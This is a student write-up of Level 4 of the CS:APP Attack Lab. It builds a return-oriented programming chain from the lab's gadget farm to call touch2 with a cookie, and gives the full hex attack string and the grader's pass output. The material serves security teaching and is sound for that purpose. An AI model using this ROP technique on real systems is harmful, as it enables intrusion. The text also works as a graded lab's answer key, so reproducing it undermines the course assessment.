# CS:APP Attacklab Writeup
## Level 4
In this level, we can't directly inject the code into stack, instead, we must use return oriented attack, which take the advantage of the existing gadget.

To attack touch 2, we must
+ Push the cookie value `0x59b997fa` into register %rdi, and
+ call touch 2.

The cookie value `0x59b997fa` can be injected into the stack.

Before returning in `getbuf`, the stack:
```
(%rsp):	0x00401976 # The first gadget address
(%rsp+8): ....
```
To take the advantage of compat encoding of `pop` instruction, we can position the cookie value at %rsp+8.

After that, the gadget returns to `touch2`, finishing the function call.

In gadget farm, we cannot find the desired instruction `pop %rdi`.

However, this gadget can be useful:
```
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret
```
From   `4019cc`, encodes:
```
popq %rax 
nop
ret
```

Next, we need to mov the value in %rax to %rdi.

We can use this gadget code, starting from address `0x4019a2`:
```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
```

Therefore we can construct the attack string:
```
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 11 11 11
cc 19 40 00 00 00 00 00
FA 97 B9 59 00 00 00 00
a2 19 40 00 00 00 00 00
EC 17 40 00 00 00 00 00
```


```
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 11 11 11 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```